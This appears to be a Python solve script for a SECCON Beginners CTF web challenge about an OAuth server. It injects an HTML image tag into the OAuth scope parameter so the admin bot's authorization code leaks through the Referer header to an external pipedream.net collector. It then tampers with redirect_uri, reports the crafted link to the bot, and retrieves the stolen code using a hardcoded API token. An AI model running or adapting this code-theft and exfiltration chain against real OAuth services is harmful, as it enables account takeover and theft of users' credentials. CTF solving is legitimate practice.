import requests
import re
import urllib
import json
import time

def solve():
    CLIENT_URL = "https://oooauth.beginners.seccon.games:3000"
    SERVER_URL = "https://oooauth.beginners.seccon.games:3001"
    ATTACKER_URL = "https://6a02ff2ea0f5f6a2c52326da9f389a44.m.pipedream.net"

    s = requests.Session()

    auth_params = {
        "response_type": "code",
        "client_id": "oauth-client",
        "scopes": f'<img/src="{ATTACKER_URL}">',
        "redirect_uri": f'{CLIENT_URL}/callback'
    }
    auth_response = s.get(f"{SERVER_URL}/auth", params=auth_params)

    approve_data = {
        "approved": "true",
        "username": "guest",
        "password": "guest"
    }
    approve_response = s.post(f"{SERVER_URL}/approve", data=approve_data, allow_redirects=False)
    match = re.search(r'code=([0-9a-f]{32})', approve_response.text)
    guest_code = match.group(1)

    auth_params = {
        "response_type": "code",
        "client_id": "oauth-client",
        "scopes": "email profile",
        "redirect_uri": f"{CLIENT_URL}/callback?code[2]={guest_code}&code=hoge"
    }
    fishing_query = urllib.parse.urlencode(auth_params)

    report_data = {
        "query": fishing_query
    }   
    report_response = s.post(f"{SERVER_URL}/report", data=report_data)

    time.sleep(3) # 3秒待機

    admin_code = get_code()
    callback_params = {
        "code": admin_code
    }
    callback_response = s.get(f"{CLIENT_URL}/callback", params=callback_params)
    flag_response = s.get(f"{CLIENT_URL}/flag")
    print(flag_response.text)

def get_code():
    pipedream_token = "81bf4fde8d4d43a2f6c7dd146b152176"
    headers = {"Authorization": "Bearer {}".format(pipedream_token)}
    res = requests.get(
        "https://api.pipedream.com/v1/sources/dc_RWuAlXz/event_summaries",
        headers=headers,
    ).text
    pipe_history = json.loads(res)
    try:
        url = pipe_history["data"][0]["event"]["headers"]["referer"]
        qs = urllib.parse.urlparse(url).query
        qs_d = urllib.parse.parse_qs(qs)
        return qs_d["code"][-1]
    except Exception:
        print("ERROR: Could not get the code.")

if __name__ == "__main__":
    solve()